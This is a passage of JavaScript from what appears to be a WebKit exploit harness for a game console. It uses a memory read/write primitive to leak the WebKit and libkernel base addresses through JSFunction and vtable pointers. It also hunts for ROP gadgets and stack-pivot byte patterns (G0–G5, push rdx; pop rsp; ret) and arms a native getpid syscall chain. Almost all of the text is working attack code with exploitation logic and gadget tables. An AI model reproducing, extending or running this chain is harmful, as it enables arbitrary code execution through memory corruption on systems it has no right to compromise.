            mark("NATIVE-SKIP", "prefix OK but full G0-G4 poops gadgets missing — Scan full (auto)");
            mark("PIVOT-FULL-HINT", fullBad.map(b => b.split(" ")[0]).join(", ")
                + " need 9-byte poops RVAs");
            return false;
        }
        if (vFull.pivot.bad.length)
            mark("PIVOT-FULL-BAD", vFull.pivot.bad.join(", "));
        mark("NATIVE-SKIP", "need PIVOT-FULL-READY — tap Verify pivot");
        return false;
    }
    return true;
}

function ensureNativePrepForFire(p, off, nm) {
    trimBeforeNativeFire();
    if (nativePrep && params.get("freshprep") !== "1") {
        const wb = chainWebkitBase(off) || nativePrep.webkitBase;
        if (wb && prepGadgetRvaStale(nativePrep, off))
            refreshPrepSlabGadgets(nativePrep, off, wb);
        mark("NATIVE-PREP", "reuse Start slab wb=" + nativePrep.webkitBase + " mode=" + nm);
        return;
    }
    nativePrep = null;
    ensureNativePrep(p, off);
    mark("NATIVE-PREP", "fresh slab wb=" + nativePrep.webkitBase + " mode=" + nm);
}

/** getpid stub @ fire — fn+delta trust (≤1 read). No lk/stub scan (OOM). */
function resolveGetpidStubOff(p, lk, off) {
    const fn = fnFromUi();
    if (fn && lk) {
        const addr = getpidStubFromFn(fn, off);
        if (addr) {
            let tag = "fn+delta-trust";
            if (p) {
                try {
                    if (isGetpidStubAt(p, addr)) tag = "fn+delta";
                } catch (_) { }
            }
            return { verified: true, addr, off: off.k_stubs[20], tag };
        }
    }
    if (!p || !lk)
        return { verified: false, tag: "no-fn", addr: null, off: null };
    return resolveGetpidStub(p, lk, off, { maxProbes: 32, fnProbes: 0, skipLkOffs: false });
}

/** lk resolved on live primitive — no reload before native fire. */
function onLkFoundHot(lk, hit) {
    lkHot = true;
    const iatRva = hit && hit.iatRva != null ? hit.iatRva : null;
    if (hit && hit.fnPtr) saveLastFnPtr(hit.fnPtr);
    saveLibkernelSession(lk, iatRva, { forced: true });
    if (addrIn) addrIn.value = String(lk);
    const via = hit ? (hit.method + "/" + hit.via) : "?";
    mark("LK-OK", lk + " (" + via + ") reads=0 — HOT (no reload)");
    mark("LK-HOT", "tap Fire getpid now — primitive still live");
    state("lk hot — Fire getpid", "ok");
    try {
        crashLog.append("LK-HOT " + lk + " " + via, "LK-OK");
        crashLog.flushSync();
    } catch (_) { }
    renderOut();
    setUi();
    if (params.get("hotfire") === "1" && getNativeMode() !== "off")
        tryHotNativeFire();
}

function tryHotNativeFire() {
    if (!ready || !window.p || busy || !nativeAllowed) return;
    const lk = lkFromUi();
    if (!lk) {
        mark("NATIVE-SKIP", "no lk for hot fire");
        renderOut();
        return;
    }
    try {
        if (!nativePrep)
            ensureNativePrep(window.p, loadEffectiveOff());
    } catch (err) {
        mark("NATIVE-SKIP", "prep: " + (err.message || String(err)));
        renderOut();
        return;
    }
    mark("LK-HOT-FIRE", "auto " + getNativeMode() + " lk=" + lk);
    renderOut();
    runFireGetpid();
}

/** Cal 2e lite — vtable leak + ext→lk vote; lk stays hot for getpid on same page. */
async function runVtable2eLk() {
    if (!ready || !window.p || busy) return false;
    const p = window.p;
    const off = loadEffectiveOff();
    let webkitBase = basesFromSession(off).webkitBase;
    if (!webkitBase && nativePrep && nativePrep.webkitBase)
        webkitBase = nativePrep.webkitBase;
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Start first");
        state("Start first", "bad");
        renderOut();
        return false;
    }

    busy = true;
    setUi();
    mark("2E-LK", "build=" + BUILD_ID + " — cal 2e lite (hot lk, no reload)");
    renderOut();

    try {
        const vtslots = params.get("vtslots");
        const result = await probeLibkernelViaVtable({
            p: p,
            carrier: window._wkCarrier || null,
            webkitBase: webkitBase,
            off: off,
            log: mark,
            read8: read8p,
            read4: read4p,
            yieldFn: function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); },
            opts: {
                full: params.get("full") === "1",
                vtslots: vtslots ? parseInt(vtslots, 10) : undefined,
                retain: retained,
            },
        });

        if (result.ok && result.lk) {
            onLkFoundHot(result.lk, result.hit);
            return true;
        }

        mark("LK-HINT", "groom 512 → Start → 2e again, or ?full=1");
        state("2e lk miss", "bad");
        renderOut();
        return false;
    } catch (err) {
        mark("LK-FAIL", err.message || String(err));
        state("2e error", "bad");
        renderOut();
        return false;
    } finally {
        busy = false;
        setUi();
    }
}

/** Collect vtable ext ptrs → vote/compare → verify — legacy heavy path. */
async function runScanExtToLk() {
    if (!ready || !window.p || busy) return false;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Start + Save bases first");
        state("Start first", "bad");
        renderOut();
        return false;
    }

    busy = true;
    setUi();
    mark("LK-EXT-SCAN", "build=" + BUILD_ID + " — live vtable + cal session");
    renderOut();

    try {
        const live = collectLiveVtableExtPtrs(p, webkitBase, off, {
            carrier: window._wkCarrier || null,
            pairCells: pairCellsForLk(),
            retain: retained,
            vtableEntries: 48,
            cellMax: 4,
        });
        mark("LK-EXT-SCAN", "cells=" + live.cells + " vtables=" + live.vtables
            + " liveExt=" + live.entries.length);
        if (live.cellDbg && live.cellDbg.length)
            mark("LK-CELL-DBG", live.cellDbg.join(" | ").slice(0, 200));

        const merged = mergeExtEntries([
            live.entries,
            calExtPtrCandidates(),
            knownExtPtrsForLk().map(function (hex) {
                return { label: "session", hex: hex, ptr: hex };
            }),
        ]);

        if (!merged.length) {
            mark("LK-EXT-MISS", "no external ptrs — run index_cal → 2e Leak vtable ptrs first");
            state("no ext ptrs — cal 2e first", "bad");
            renderOut();
            return false;
        }

        mark("LK-EXT-SCAN", "merged n=" + merged.length + " — voting…");
        for (let i = 0; i < merged.length && i < 8; i++) {
            mark("LK-EXT-CAND", merged[i].label + " " + merged[i].hex
                + (merged[i].code ? " code=" + merged[i].code : ""));
        }
        renderOut();

        const hit = resolveLibkernelFromExtList(p, webkitBase, off, merged, {
            minVotes: 1,
            minDistinctFn: 2,
            allowSinglePriRva: true,
        });

        if (hit.zeroRank && hit.zeroRank.length)
            logExtScanRank("LK-ZERO-RANK", hit.zeroRank);
        if (!hit.ok && hit.ptrDiag)
            logExtPtrDiag(hit.ptrDiag);

        if (hit.ok && hit.lk) {
            onLkFoundHot(hit.lk, hit);
            return true;
        }

        mark("LK-EXT-MISS", hit.error || "no consensus lk");
        if (hit.hint)
            mark("LK-HINT", hit.hint);
        else if (hit.zeroRank && hit.zeroRank.length)
            mark("LK-HINT", "need 2+ ext fn ptrs → same 16KB lk (no lk peek)");
        else
            mark("LK-HINT", "ext ptrs may be libc/webkit — re-run cal 2e after groom");
        state("ext scan miss", "bad");
        renderOut();
        return false;
    } catch (err) {
        mark("LK-FAIL", err.message || String(err));
        state("ext scan error", "bad");
        renderOut();
        return false;
    } finally {
        busy = false;
        setUi();
    }
}

/** Manual tests — one button = minimal reads, one log line. */
const MANUAL_TESTS = [
    { id: "elf", group: "base", label: "ELF @ base" },
    { id: "native", group: "base", label: "nativeFn code" },
    { id: "scan-iat", group: "base", label: "Scan libkernel" },
    { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
    { id: "try-cal-ptrs", group: "base", label: "Scan ext→lk" },
    { id: "verify-lk", group: "base", label: "Accept lk (0 read)" },
    { id: "accept-fn", group: "base", label: "Accept fn (0 read)" },
    { id: "show-lk", group: "base", label: "Show LK hints" },
    { id: "try-billzai-lk", group: "base", label: "Try BillZai lk" },
    { id: "force-lk", group: "base", label: "Force lk" },
    { id: "paste-lk", group: "base", label: "Paste lk (1 peek)" },
    { id: "libkernel", group: "base", label: "libkernel" },
    { id: "stub20", group: "base", label: "getpid stub" },
    { id: "pop_rdi", group: "pop", label: "POP RDI", key: "wk_POP_RDI_RET", pat: [0x5f, 0xc3] },
    { id: "pop_rsi", group: "pop", label: "POP RSI", key: "wk_POP_RSI_RET", pat: [0x5e, 0xc3] },
    { id: "pop_rdx", group: "pop", label: "POP RDX", key: "wk_POP_RDX_RET", pat: [0x5a, 0xc3] },
    { id: "pop_rcx", group: "pop", label: "POP RCX", key: "wk_POP_RCX_RET", pat: [0x59, 0xc3] },
    { id: "pop_rax", group: "pop", label: "POP RAX", key: "wk_POP_RAX_RET", pat: [0x58, 0xc3] },
    { id: "pop_r8", group: "pop", label: "POP R8", key: "wk_POP_R8_RET", pat: [null, 0x58, 0xc3] },
    { id: "pop_r9", group: "pop", label: "POP R9", key: "wk_POP_R9_RET", pat: [null, 0x59, 0xc3] },
    { id: "leave", group: "pop", label: "LEAVE", key: "wk_LEAVE_RET", pat: [0xc9, 0xc3] },
    { id: "mov_rdi_rax", group: "pivot", label: "MOV [rdi],rax", key: "wk_MOV_QWORD_PTR_RDI_RAX_RET", pat: [0x48, 0x89, 0x07, 0xc3] },
    { id: "g0", group: "pivot", label: "G0", key: "wk_MOV_RDI_RSI_30_CALL", pat: [0x48, 0x8b, 0x7e, 0x30] },
    { id: "g1", group: "pivot", label: "G1", key: "wk_POP_RAX_MOV_RAX_JMP_18", pat: [0x58, 0x48, 0x8b, 0x07] },
    { id: "g2", group: "pivot", label: "G2", key: "wk_PUSH_RBP_MOV_RBP_RSP_10", pat: [0x55, 0x48, 0x89, 0xe5] },
    { id: "g3", group: "pivot", label: "G3", key: "wk_MOV_RDI_RAX_8_CALL_20", pat: [0x48, 0x8b, 0x78, 0x08] },
    { id: "g4", group: "pivot", label: "G4", key: "wk_MOV_RDX_RAX_18_CALL_10", pat: [0x48, 0x8b, 0x50, 0x38], spKey: true },
    { id: "g5", group: "pivot", label: "G5 probe", key: "wk_PUSH_RDX_POP_RSP_RET", pat: [0x52, 0x5c, 0xc3] },
];

function runManualTest(testId) {
    const preStartOk = testId === "verify-lk" || testId === "accept-fn" || testId === "force-lk" || testId === "paste-lk"
        || testId === "try-cal-ptrs";
    if (preStartOk) {
        if (testId === "verify-lk") {
            runVerifyLk();
            return;
        }
        if (testId === "accept-fn") {
            acceptFnFromHex(null);
            return;
        }
        if (testId === "try-cal-ptrs") {
            calcLkFromHex();
            return;
        }
        if (testId === "force-lk" || testId === "paste-lk") {
            acceptLkFromHex(null);
            return;
        }
    }
    if (!ready || !window.p) return;
    if (busy && testId !== "verify-lk" && testId !== "accept-fn" && testId !== "force-lk" && testId !== "paste-lk"
        && testId !== "try-billzai-lk") {
        mark("SKIP", "busy — Stop find or wait");
        renderOut();
        return;
    }
    const p = window.p;
    const off = loadEffectiveOff();
    const { nativeFn, webkitBase: sessionWb, libkernelBase } = basesFromSession(off);
    const webkitBase = chainWebkitBase(off);
    const test = MANUAL_TESTS.find(t => t.id === testId);
    if (!test) return;

    if (test.group === "base") {
        if (testId === "elf") {
            if (!webkitBase) {
                mark("GADGET-SKIP", "ELF — no webkitBase (Save bases or cal Accept)");
                return;
            }
            const magic = read4p(p, webkitBase);
            if (magic === ELF_MAGIC)
                mark("GADGET-OK", "ELF magic @ " + webkitBase);
            else if (off.wk_POP_RDI_RET != null) {
                const g = checkPat(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3]);
                mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
                    "ELF miss peek=" + fmtHex32(magic) + " but POP_RDI " + g.detail);
            } else {
                mark("GADGET-BAD", "ELF @ " + webkitBase + " peek=" + fmtHex32(magic));
            }
            return;
        }
        if (testId === "native") {
            if (!nativeFn) {
                mark("GADGET-SKIP", "nativeFn — tap Save bases or cal Accept");
                return;
            }
            const q0 = read4p(p, nativeFn);
            if (q0 == null || q0 === 0 || q0 === 0xffffffff || q0 === 0xcccccccc)
                mark("GADGET-BAD", "nativeFn @ " + nativeFn + " code0=" + fmtHex32(q0));
            else
                mark("GADGET-OK", "nativeFn @ " + nativeFn + " code0=" + fmtHex32(q0));
            return;
        }
        if (testId === "libkernel") {
            if (!webkitBase) {
                mark("GADGET-SKIP", "libkernel — no webkitBase");
                return;
            }
            const r = resolveLibkernel(p, webkitBase, off, {
                log: mark,
                read8: read8p,
            });
            if (r.ok)
                mark("GADGET-OK", "libkernel " + r.lk + " (" + r.source + ")");
            else
                mark("GADGET-BAD", r.error || "libkernel resolve failed");
            return;
        }
        if (testId === "paste-lk") {
            const raw = addrIn && addrIn.value ? addrIn.value.trim() : "";
            if (!raw) {
                mark("LK-SKIP", "paste 16KB lk base or cal ext fn ptr — Accept lk (0 read)");
                return;
            }
            const parsed = parseAddr(raw.replace(/^0x/i, ""));
            if (!parsed) {
                mark("LK-FAIL", "bad hex");
                return;
            }
            const offL = loadEffectiveOff();
            const hits = calcLkFromFnPtrZeroRead(parsed, offL);
            if (hits.length) {
                const h = hits[0];
                if (addrIn) addrIn.value = String(h.lk);
                saveLibkernelSession(h.lk, null);
                mark("LK-OK", String(h.lk) + " = fn−" + h.key + " (0 reads)");
                state("lk accepted — Arm → Fire", "ok");
            } else {
                const v = verifyLibkernelZeroRead(parsed, offL, { via: "paste" });
                if (v.ok) {
                    saveLibkernelSession(parsed, null);
                    mark("LK-OK", String(parsed) + " (0 reads, 16KB lk)");
                    state("lk accepted — Arm → Fire", "ok");
                } else {
                    mark("LK-FAIL", v.error || "not lk — Calc lk from cal ext ptr");
                    state("paste miss — Calc lk (0 read)", "bad");
                }
            }
            renderOut();
            crashLog.append("LK-PASTE " + raw, "LK-OK");
            crashLog.flushSync();
            return;
        }
        if (testId === "try-billzai-lk") {
            runTryBillZaiLk();
            return;
        }
        if (testId === "force-lk") {
            const raw = addrIn && addrIn.value ? addrIn.value.trim() : "";
            const lk = parseAddr(raw.replace(/^0x/i, ""));
            if (!lk) {
                mark("LK-SKIP", "enter libkernel base hex, then Force lk (0 reads)");
                return;
            }
            runForceLkOnly(lk);
            return;
        }
        if (testId === "scan-iat") {
            runScanIat().catch(function (err) {
                mark("LK-FAIL", err.message || String(err));
                busy = false;
                setUi();
                renderOut();
            });
            return;
        }
        if (testId === "probe-lk" || testId === "show-lk") {
            runShowLkHints();
            return;
        }
        if (testId === "leak-lk") {
            runVtable2eLk().catch(function (err) {
                mark("LK-FAIL", err.message || String(err));
                busy = false;
                setUi();
                renderOut();
            });
            return;
        }
        if (testId === "try-cal-ptrs") {
            runTryCalPtrs();
            return;
        }
        if (testId === "verify-lk") {
            runVerifyLk();
            return;
        }
        if (testId === "stub20") {
            let lk = libkernelBase;
            if (!lk && webkitBase) {
                const r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
                if (r.ok) lk = r.lk;
            }
            if (!lk) {
                mark("GADGET-SKIP", "getpid stub — run libkernel test first");
                return;
            }
            const o = off.k_stubs && off.k_stubs[SYS_GETPID];
            if (o == null) {
                mark("GADGET-SKIP", "no k_stubs[20] offset");
                return;
            }
            const v = read8p(p, lk.add32(o));
            if (isGetpidStub(v) || isGetpidStubAt(p, lk.add32(o)))
                mark("GADGET-OK", "getpid stub @ lk+" + o.toString(16));
            else
                mark("GADGET-BAD", "stub @+" + o.toString(16) + " read8=" + (v ? String(v) : "null"));
            return;
        }
    }

    if (!webkitBase) {
        mark("GADGET-SKIP", test.label + " — no webkitBase (Save bases or cal Accept)");
        return;
    }
    let rva = off[test.key];
    let pat = test.pat;
    if (test.spKey && off.pivot_view_sp != null)
        pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
    if (test.group === "pivot" && testId !== "g5") {
        const row = pivotRowByLabel(test.label);
        if (row) pat = pivotPattern(row, off);
    }
    if (rva == null && test.group === "pivot") {
        if (testId === "g5") {
            runG5ClusterProbe();
            return;
        }
        const hint = pivotHint(test.key);
        if (hint > 0 && g5RvaSafe(hint, off)) {
            const g = checkPat(p, webkitBase, hint, pat);
            mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
                test.label + " hint +0x" + hint.toString(16) + " " + g.detail);
        } else {
            mark("GADGET-SKIP", test.label + " — no safe low RVA (never reads 13.00 high hint)");
        }
        updatePivotReady(p, off);
        setUi();
        return;
    }
    if (testId === "g5" && rva != null) {
        const g5 = checkG5Bytes((a) => read1p(p, a), webkitBase, rva);
        mark(g5 ? "GADGET-OK" : "GADGET-BAD",
            test.label + " +0x" + rva.toString(16)
                + (g5 ? " " + g5.kind : " — not a rdx→rsp pivot"));
        updatePivotReady(p, off);
        setUi();
        return;
    }
    const g = checkPat(p, webkitBase, rva, pat);
    mark(g.ok ? "GADGET-OK" : "GADGET-BAD", test.label + " " + g.detail);
    if (test.group === "pivot") {
        updatePivotReady(p, off);
        setUi();
    }
}

function saveBasesManual() {
    if (!ready || !window.p || busy) return;
    busy = true;
    setUi();
    try {
        const p = window.p;
        const off = loadEffectiveOff();
        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function || 0x28));
        if (!nativeFn) {
            mark("SAVE-FAIL", "nativeFn capture failed");
            return;
        }
        const webkitBase = (nativeFn && off.wk_expm1_builtin)
            ? nativeFn.sub32(off.wk_expm1_builtin)
            : resolveWebkitBase(off, nativeFn);
        if (webkitBase) {
            persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
            mark("SAVE-OK", "nativeFn=" + nativeFn + " webkitBase=" + webkitBase);
            mark("SAVE-HINT", "cal/index_rw share session — open index_cal after this");
        } else {
            persistSessionBases(nativeFn, null);
            mark("SAVE-OK", "nativeFn=" + nativeFn + " (no expm1 for base)");
        }
        state("bases saved — tap gadget buttons", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

function gadgetBytesHex(p, base, rva, n) {
    const out = [];
    for (let i = 0; i < n; i++) {
        const b = read1p(p, base.add32(rva + i));
        out.push(b == null ? "??" : (b & 0xff).toString(16).padStart(2, "0"));
    }
    return out.join(" ");
}

function pivotRowByLabel(label) {
    const base = label.split(" ")[0];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        if (PIVOT_ROWS[i][0] === base) return PIVOT_ROWS[i];
    }
    return null;
}

function logPopBadBytes(p, webkitBase, off, labels) {
    for (let i = 0; i < labels.length; i++) {
        const lab = labels[i];
        const row = CHAIN_POP_ROWS.find(r => r[0] === lab);
        if (!row) continue;
        const rva = off[row[1]];
        if (rva == null) continue;
        mark("POP-HEX", lab + " +0x" + rva.toString(16)
            + " got " + gadgetBytesHex(p, webkitBase, rva, 4)
            + " want " + fmtBytes(row[2].filter(x => x != null)));
    }
}

function logPivotBadBytes(p, webkitBase, off, labels) {
    for (let i = 0; i < labels.length; i++) {
        const lab = labels[i].split(" ")[0];
        const row = pivotRowByLabel(lab);
        if (!row) continue;
        const rva = off[row[1]];
        if (rva == null) continue;
        const exec = pivotExecPattern(lab, off);
        const prefix = pivotPattern(row, off);
        const pat = exec || prefix;
        const n = lab === "G5" ? 6 : Math.max(pat.length, 12);
        let want = "";
        if (lab === "G5") {
            want = " (want 52 5c c3 or 48 89 d4 c3)";
        } else if (exec) {
            want = " want-full " + fmtBytes(exec);
            if (exec !== prefix && checkPivotBytes(a => read1p(p, a), webkitBase, rva, prefix))
                want += " (prefix OK — need FULL gadget)";
        }
        mark("PIVOT-HEX", lab + " +0x" + rva.toString(16)
            + " got " + gadgetBytesHex(p, webkitBase, rva, n) + want);
    }
}

/** Never sync-scan low .text from Verify — millions of reads OOM the tab. Use Scan pivot (auto). */
function scanPivotFullNearOnly(p, webkitBase, off, badLabels, maxSteps) {
    const hits = {};
    maxSteps = maxSteps || 512;
    for (let i = 0; i < badLabels.length; i++) {
        const lab = badLabels[i].split(" ")[0];
        if (lab === "G5" || lab === "MOV_RDI_RAX") continue;
        const row = pivotRowByLabel(lab);
        if (!row) continue;
        const key = row[1];
        const pat = pivotExecPattern(lab, off);
        if (!pat) continue;
        const hint = off[key] != null ? off[key] : pivotHint(key);
        if (hint <= 0) continue;
        const cap = scanCapOff();
        const lo = Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS);
        const hi = Math.min(cap, hint + SCAN_NEAR_RADIUS);
        let found = null;
        let steps = 0;
        for (let rva = lo & ~7; rva < hi && steps < maxSteps; rva += 8, steps++) {
            if (checkPivotBytes(a => read1p(p, a), webkitBase, rva, pat)) {
                found = rva;
                break;
            }
        }
        if (found != null) {
            hits[key] = found;
            mark("PIVOT-FULL-HIT", lab + " +0x" + found.toString(16)
                + " (near) was +0x" + hint.toString(16));
        }
    }
    if (Object.keys(hits).length) {
        savePivotFullOverride(webkitBase, hits);
        mark("PIVOT-FULL-SAVE", Object.keys(hits).join(", ") + " — re-verify");
        return true;
    }
    return false;
}

function pivotNotReadyMsg(v) {
    const parts = [];
    if (v.missing.length) parts.push("missing " + v.missing.join(", "));
    if (v.bad.length) parts.push("bad " + v.bad.join(", "));
    return parts.length ? parts.join("; ") : "?";
}

function applyG5Rva(rva) {
    const { webkitBase } = basesFromSession(loadEffectiveOff());
    saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: rva });
    mark("G5-SET", "+0x" + rva.toString(16) + " saved — verifying…");
    if (ready && window.p && webkitBase) {
        verifyPivotManual();
    } else if (!webkitBase) {
        mark("G5-HINT", "Save bases then tap Verify pivot");
    }
    setUi();
}

function clearPivotState() {
    try {
        sessionStorage.removeItem("wk-pivot-scan-state");
        sessionStorage.removeItem("wk-scanned-pivot");
        sessionStorage.removeItem("wk-scanned-pivot-base");
    } catch (_) { }
    clearPivotFullOverride();
    sanitizeScannedPivotStorage();
    pivotScan = null;
    pivotReady = false;
    mark("PIVOT-CLEAR", "G5 + scan state cleared — G0-G4 restored to HW table");
    setUi();
}

function restoreHwPivot() {
    sanitizeScannedPivotStorage();
    clearPivotFullOverride();
    try {
        sessionStorage.removeItem("wk-pivot-scan-state");
    } catch (_) { }
    pivotScan = null;
    mark("PIVOT-RESTORE", "G0-G4 HW RVAs restored — only G5 from session if set");
    if (ready && window.p) verifyPivotManual();
    else setUi();
}

function pickBestG5Cand(cands, center) {
    if (!cands.length) return null;
    const rdx = cands.filter(c => /rdx/i.test(c.kind));
    const pool = rdx.length ? rdx : cands;
    pool.sort((a, b) => Math.abs(a.rva - center) - Math.abs(b.rva - center));
    return pool[0];
}

function scanG5PatternsAt(p, webkitBase, rva, cands, center) {
    if (!fillWindow16(p, webkitBase, rva, _win16)) return;
    for (let pi = 0; pi < G5_PATTERNS.length; pi++) {
        const pat = G5_PATTERNS[pi].pat;
        for (let start = 0; start <= 16 - pat.length; start++) {
            if (!matchPatAt(_win16, start, pat)) continue;
            g5CandPush(cands, { rva: rva + start, kind: G5_PATTERNS[pi].kind }, center);
        }
    }
    for (let start = 0; start <= 12; start++) {
        if (_win16[start + 1] === 0x52 && _win16[start + 2] === 0x5c && _win16[start + 3] === 0xc3
            && _win16[start] >= 0x40 && _win16[start] <= 0x4f) {
            g5CandPush(cands, {
                rva: rva + start,
                kind: "rex push rdx; pop rsp; ret",
            }, center);
        }
    }
}

function scanCapOff() {
    return webkitRvaMax(loadEffectiveOff());
}

function guardG5Rva(rva, tag) {
    const off = loadEffectiveOff();
    const cap = webkitRvaMax(off);
    if (!g5RvaSafe(rva, off)) {
        mark("G5-BLOCK", (tag || "G5") + " +0x" + rva.toString(16)
            + " beyond mapped webkit (~+0x" + cap.toString(16) + ") — skip read (OOM on HW)");
        return false;
    }
    return true;
}

function tryLegacyG5(rva, tag) {
    if (!ready || !window.p) {
        mark("G5-SKIP", "need Start + Save bases");
        return;
    }
    const p = window.p;
    const { webkitBase } = basesFromSession(loadEffectiveOff());
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase");
        return;
    }
    if (!guardG5Rva(rva, tag)) return;
    mark("G5-TRY", tag + " +0x" + rva.toString(16));
    const hex = gadgetBytesHex(p, webkitBase, rva, 8);
    if (hex.indexOf("??") >= 0)
        mark("G5-READ-FAIL", "+0x" + rva.toString(16) + " unreadable — bad base or unmapped");
    else
        mark("G5-HEX", "+0x" + rva.toString(16) + " " + hex);
    const g5 = checkG5Bytes((a) => read1p(p, a), webkitBase, rva);
    if (g5) {
        mark("GADGET-OK", "G5 " + tag + " +0x" + rva.toString(16) + " " + g5.kind);
        saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: rva });
        verifyPivotManual();
    } else {
        mark("GADGET-BAD", "G5 " + tag + " +0x" + rva.toString(16) + " — not rdx→rsp pivot");
    }
}

async function runG5ScanRange(minRva, maxRva, center, label) {
    if (!ready || !window.p || busy) return null;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase — Save bases first");
        return null;
    }
    const cap = webkitRvaMax(off);
    if (minRva > cap) {
        mark("G5-BLOCK", label + " min +0x" + minRva.toString(16)
            + " beyond module ~+0x" + cap.toString(16));
        return null;
    }
    maxRva = Math.min(maxRva, cap);
    if (minRva >= maxRva) {
        mark("G5-SKIP", label + " empty range");
        return null;
    }
    g5Hunt = {
        center: center,
        minRva: minRva,
        maxRva: maxRva,
        cursor: null,
        cands: [],
        done: false,
    };
    busy = true;
    scanQuiet = true;
    setUi();
    mark("G5-HUNT", label + " +0x" + minRva.toString(16) + "…+0x" + maxRva.toString(16));
    let huntBest = null;
    try {
        let finished = false;
        while (!finished)
            finished = await g5HuntChunk(p, webkitBase);
        if (g5Hunt.cands.length) {
            logG5Cands(g5Hunt.cands);
            const best = pickBestG5Cand(g5Hunt.cands, center);
            if (best) {
                mark("G5-HUNT-BEST", "+0x" + best.rva.toString(16) + " " + best.kind);
                saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: best.rva });
                huntBest = best.rva;
            }
        } else {
            mark("G5-HUNT-MISS", label + " — no rdx→rsp pivot");
        }
    } finally {
        scanQuiet = false;
        g5Hunt = null;
        busy = false;
        renderOut();
        setUi();
        if (huntBest != null) verifyPivotManual();
    }
    return huntBest;
}

async function runG5HuntNear() {
    if (g5Hunt && !g5Hunt.done) {
        g5Hunt = null;
        mark("G5-STOP", "hunt cancelled");
        return;
    }
    const cap = scanCapOff();
    await runG5ScanRange(
        Math.max(SCAN_PIVOT_MIN, G5_HUNT_CENTER - G5_HUNT_RADIUS),
        Math.min(cap, G5_HUNT_CENTER + G5_HUNT_RADIUS),
        G5_HUNT_CENTER,
        "low-near-2411b0");
}

async function runG5HuntExpm1() {
    const off = loadEffectiveOff();
    const center = g5Expm1Hint(off) || (HW_GADGETS_1352.wk_expm1_builtin + G5_EXPM1_DELTA);
    if (!g5RvaSafe(center, off)) {
        mark("G5-SKIP", "expm1 hint +0x" + center.toString(16) + " out of module bounds");
        return;
    }
    const cap = webkitRvaMax(off);
    await runG5ScanRange(
        Math.max(SCAN_PIVOT_MIN, center - G5_HUNT_RADIUS),
        Math.min(cap, center + G5_HUNT_RADIUS),
        center,
        "expm1-delta");
}

async function runG5UpperScan() {
    const off = loadEffectiveOff();
    const cap = webkitRvaMax(off);
    const lo = SCAN_LOW_MAX;
    if (lo >= cap) {
        mark("G5-SKIP", "upper range empty — module ends ~+0x" + cap.toString(16)
            + " (13.00 high G5 @ +0x2abccaa is unmapped)");
        return;
    }
    mark("G5-INFO", "scanning +0x" + lo.toString(16) + "…+0x" + cap.toString(16)
        + " (pop rcx @ +0xeaf246 lives here — missed by 8MB cap)");
    await runG5ScanRange(lo, cap, off.wk_POP_RCX_RET || 0xeaf246, "upper-low");
}

async function probeWebkitBound() {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("MOD-SKIP", "no webkitBase");
        return;
    }
    const floor = Math.max(0x100000, webkitRvaMaxFromOff(off) - 0x180000);
    let lastOk = floor;
    mark("MOD-PROBE", "stepping +64K from +0x" + floor.toString(16) + "…");
    busy = true;
    setUi();
    try {
        for (let rva = floor; rva < 0x3500000; rva += 0x10000) {
            const b = read1p(p, webkitBase.add32(rva));
            if (b == null) {
                saveWebkitRvaProbe(lastOk);
                mark("MOD-BOUND", "max readable ~+0x" + lastOk.toString(16)
                    + " (+0x" + rva.toString(16) + " unreadable — no high G5 reads)");
                return;
            }
            lastOk = rva;
            if ((rva & 0xfffff) === 0)
                mark("MOD-PROBE", "+0x" + rva.toString(16) + " ok");
            await new Promise(r => setTimeout(r, 0));
        }
        saveWebkitRvaProbe(lastOk);
        mark("MOD-BOUND", "probe cap +0x" + lastOk.toString(16));
    } finally {
        busy = false;
        setUi();
    }
}

async function runG5FullHunt() {
    scanG5Full = true;
    await runG5ScanRange(SCAN_PIVOT_MIN, SCAN_LOW_MAX, G5_HUNT_CENTER, "low-full");
    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
    await runG5HuntExpm1();
    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
    await runG5UpperScan();
    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
    for (let i = 0; i < G5_LEGACY_RVAS.length; i++)
        tryLegacyG5(G5_LEGACY_RVAS[i][0], G5_LEGACY_RVAS[i][1]);
}

async function g5HuntChunk(p, webkitBase) {
    if (!g5Hunt) return true;
    let rva = g5Hunt.cursor != null ? g5Hunt.cursor : (g5Hunt.minRva & ~7);
    let steps = 0;
    while (rva < g5Hunt.maxRva && steps < SCAN_CHUNK_STEPS) {
        scanG5PatternsAt(p, webkitBase, rva, g5Hunt.cands, g5Hunt.center);
        rva += 8;
        steps++;
        if (SCAN_YIELD_EVERY > 0 && (steps & (SCAN_YIELD_EVERY - 1)) === 0)
            await new Promise(r => setTimeout(r, 0));
    }
    g5Hunt.cursor = rva;
    scanState("G5 hunt @+0x" + rva.toString(16) + " hits=" + g5Hunt.cands.length);
    return rva >= g5Hunt.maxRva;
}

function peekG5Rva(rva) {
    if (!ready || !window.p) {
        mark("G5-SKIP", "need Start + Save bases first");
        return;
    }
    const off = loadEffectiveOff();
